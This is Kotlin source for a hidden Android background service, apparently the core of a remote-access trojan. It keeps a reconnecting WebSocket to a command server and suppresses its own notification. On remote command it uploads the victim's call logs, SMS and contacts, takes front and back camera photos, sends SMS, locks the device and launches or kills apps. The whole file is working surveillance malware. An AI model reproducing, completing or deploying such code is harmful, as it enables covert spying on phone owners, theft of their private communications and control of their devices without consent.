package com.example.betryalcommit

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit

class MyService : Service() {
    private lateinit var webSocket: WebSocket
    private lateinit var client: OkHttpClient
    private lateinit var request: Request
   // private val serverUrl = "https://betryal-commit-back.onrender.com"
   private val serverUrl = "ws://192.168.31.50:8080"
  // private val serverUrl = "https://bertrylcommit-back.botsailer1.repl.co/"
    private val NOTIFICATION_ID = 1410
    private var isWebSocketInitialized = false
    private lateinit var context: Context



    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        context = this
        client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
        request = Request.Builder().url(serverUrl).build()
        if (!isWebSocketInitialized) {
            webSocket = client.newWebSocket(request, MyWebSocketListener())
            isWebSocketInitialized = true
        }
            startForeground(NOTIFICATION_ID, createNotification())
        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "lal_harpic"
        val channelName = "neela_harpic"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val importance = NotificationManager.IMPORTANCE_NONE
            val channel = NotificationChannel(channelId, channelName, importance)
            notificationManager.createNotificationChannel(channel)
        }
        val builder = NotificationCompat.Builder(this, channelId)
        builder.setPriority(NotificationCompat.PRIORITY_LOW)
        builder.setVisibility(NotificationCompat.VISIBILITY_SECRET)
        return builder.build()
    }


    private fun reconnectWebSocket() {
            try {
                Thread.sleep(2000)
                if (!isSocketConnected) {
                    webSocket.cancel()
                    webSocket = client.newWebSocket(request, MyWebSocketListener())
                }
            } catch (e: InterruptedException) {
                e.printStackTrace()
            }
    }
    inner class MyWebSocketListener : WebSocketListener() {


        override fun onOpen(webSocket: WebSocket, response: Response) {
            isSocketConnected = true
            this@MyService.webSocket = webSocket
            Log.d("WebSocket", "Connected to server")
           val json = JSONObject()
            json.put("type", "hello");
            json.put("data", "done connection");
            webSocket.send(json.toString());
        }
        override fun onMessage(webSocket: WebSocket, text: String) {
            Log.d("WebSocket", "Received message: $text")

               var json = JSONObject(text)
                val commands = json.getString("commands")
               val data = json.getString("data")
               var num = ""
               var msg = ""
               if (data.contains(":")){
                    num = data.split(":")[0]
                     msg = data.split(":")[1]
               }
               when (commands) {
                   "restart_app" -> {
                       val p =  packagefun(context,webSocket)
                       p.Gameterminator(data)
                   }
                   "run_app" ->{
                       val p =  packagefun(context,webSocket)
                       p.launchApp(data)
                   }
                   "app_logs" -> {
                       val p =  packagefun(context,webSocket)
                       p.applog(webSocket)
                   }
                    "lock" ->AdminAct.lockdev()
                    "call_logs" -> { callutil.uploadCalls(context.contentResolver,webSocket) }
                     "wallpaper" -> {
                         Log.e("wallpaper",data)
                         wallpaperset.setwall(context,data)
                     }
                    "sms_logs" -> {
                        Teleserv.uploadsms(context.contentResolver, this@MyService,webSocket)
                    }
                    "contacts" -> {
                        Teleserv.uploadContact(context.contentResolver, this@MyService,webSocket)
                    }
                    "camera0" -> CameraCaptureHelper().captureBack(context,webSocket);
                    "camera1" -> CameraCaptureHelper().captureFront(context,webSocket);
                    "sms_send" -> {
                       Teleserv.sendMessage(context,num,msg); }

               else -> null
               }

        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            Log.d("WebSocket", "Connection closed")
            isSocketConnected = false
            reconnectWebSocket()
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            isSocketConnected = false
            Log.e("WebSocket", "Connection error: ${t.message}")
            reconnectWebSocket()
        }
    }
    companion object {
        private var isSocketConnected: Boolean = false

    }

}



